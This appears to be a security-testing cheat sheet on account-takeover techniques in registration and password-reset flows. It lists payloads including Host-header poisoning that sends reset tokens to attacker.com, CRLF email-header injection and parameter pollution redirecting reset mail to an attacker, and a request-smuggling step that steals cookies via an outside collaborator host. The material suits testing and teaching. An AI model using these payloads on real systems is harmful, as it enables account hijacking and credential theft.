# registration-vulnerabilities
Registration Takeover
Duplicate Registration
Try to generate using an existing username
Check varying the email:
uppsercase
+1@
add some some in the email
special characters in the email name (%00, %09, %20)
Put black characters after the email: test@test.com a
victim@gmail.com@attacker.com
victim@attacker.com@gmail.com
Username Enumeration
Check if you can figure out when a username has already been registered inside the application.

Password Policy
Creating a user check the password policy (check if you can use weak passwords).
In that case you may try to bruteforce credentials.

SQL Injection
Check this page to learn how to attempt account takeovers or extract information via SQL Injections in registry forms.

Oauth Takeovers
{% content-ref url="oauth-to-account-takeover.md" %} oauth-to-account-takeover.md {% endcontent-ref %}

SAML Vulnerabilities
{% content-ref url="saml-attacks/" %} saml-attacks {% endcontent-ref %}

Change Email
when registered try to change the email and check if this change is correctly validated or can change it to arbitrary emails.

More Checks
Check if you can use disposable emails
Long password (>200) leads to DoS
Check rate limits on account creation
Use username@burp_collab.net and analyze the callback
Password Reset Takeover
Password Reset Token Leak Via Referrer
Request password reset to your email address
Click on the password reset link
Don’t change password
Click any 3rd party websites(eg: Facebook, twitter)
Intercept the request in Burp Suite proxy
Check if the referer header is leaking password reset token.
Password Reset Poisoning
Intercept the password reset request in Burp Suite
Add or edit the following headers in Burp Suite : Host: attacker.com, X-Forwarded-Host: attacker.com
Forward the request with the modified header
http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com
Look for a password reset URL based on the host header like : https://attacker.com/reset-password.php?token=TOKEN
Password Reset Via Email Parameter
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
IDOR on API Parameters
Attacker have to login with their account and go to the Change password feature.
Start the Burp Suite and Intercept the request
Send it to the repeater tab and edit the parameters : User ID/email
powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})
Weak Password Reset Token
The password reset token should be randomly generated and unique every time.
Try to determine if the token expire or if it’s always the same, in some cases the generation algorithm is weak and can be guessed. The following variables might be used by the algorithm.

Timestamp
UserID
Email of User
Firstname and Lastname
Date of Birth
Cryptography
Number only
Small token sequence ( characters between [A-Z,a-z,0-9])
Token reuse
Token expiration date
Leaking Password Reset Token
Trigger a password reset request using the API/UI for a specific email e.g: test@mail.com
Inspect the server response and check for resetToken
Then use the token in an URL like https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]
Password Reset Via Username Collision
Register on the system with a username identical to the victim’s username, but with white spaces inserted before and/or after the username. e.g: "admin "
Request a password reset with your malicious username.
Use the token sent to your email and reset the victim password.
Connect to the victim account with the new password.
The platform CTFd was vulnerable to this attack.
See: CVE-2020-7245

Account Takeover Via Cross Site Scripting
Find an XSS inside the application or a subdomain if the cookies are scoped to the parent domain : *.domain.com
Leak the current sessions cookie
Authenticate as the user using the cookie
Account Takeover Via HTTP Request Smuggling
1. Use smuggler to detect the type of HTTP Request Smuggling (CL, TE, CL.TE)
powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h
2. Craft a request which will overwrite the POST / HTTP/1.1 with the following data:
GET http://something.burpcollaborator.net HTTP/1.1 X: with the goal of open redirect the victims to burpcollab and steal their cookies
3. Final request could look like the following

GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
Hackerone reports exploiting this bug
* https://hackerone.com/reports/737140
* https://hackerone.com/reports/771666

Account Takeover via CSRF
Create a payload for the CSRF, e.g: “HTML form with auto submit for a password change”
Send the payload
Account Takeover via JWT
JSON Web Token might be used to authenticate an user.

Edit the JWT with another User ID / Email
Check for weak JWT signature
{% content-ref url="hacking-jwt-json-web-tokens.md" %} hacking-jwt-json-web-tokens.md {% endcontent-ref %}

References
https://salmonsec.com/cheatsheet/account_takeover
